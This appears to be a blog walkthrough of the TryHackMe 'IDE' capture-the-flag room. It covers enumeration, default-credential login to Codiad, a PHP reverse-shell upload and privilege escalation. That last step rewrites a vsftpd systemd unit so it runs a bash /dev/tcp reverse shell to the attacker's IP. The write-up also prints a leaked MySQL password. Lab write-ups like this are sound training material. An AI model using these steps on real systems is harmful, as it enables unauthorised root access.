---
title: Walkthrough - IDE
published: true
---

Enumeration, Public Exploit, PrivEsc, FTP. Easy box for enumeration.

[https://tryhackme.com/room/ide](https://tryhackme.com/room/ide)

* * *

## Notes

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.127.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%), QNAP QTS 4.0 - 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
```

- Codiad 2.8.4
- ``searchsploit``
- After bashing my head against the wall for a few hours going back into the ftp and browsing previous directories can see a file named ``-`` we can get that and check it out

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

- can login to the Codiad with ``john:password``
- inside the clouscall folder uploaded pentestmonkey php shell and setup a listener to get a shell.
- running linpeas we find a password in history

```
mysql -u drac -p 'Th3dRaCULa1sR3aL' 
```

we can login to drac with these creds.

* * * 

## What is the user flag?

![0xskar](/assets/ide01.png)

- `sudo -l`

```
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

This means I can restart the vsfptd server and this is great news because checking `ps aux` the vsftpd runs as root so we should be able to take advantage of this somehow.

- `find / -type f -name "vsftpd.*" 2>/dev/null`

Because we are restarting the service lets check out this file

- `nano /lib/systemd/system/vsftpd.service`

and edit it to send us a root reverse shell

```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.127.225/6667 0>&1'


[Install]
WantedBy=multi-user.target
```

- and restart the server after setting up listener

* * * 

## What is the root flag?

![0xskar](/assets/ide02.png)

* * * 

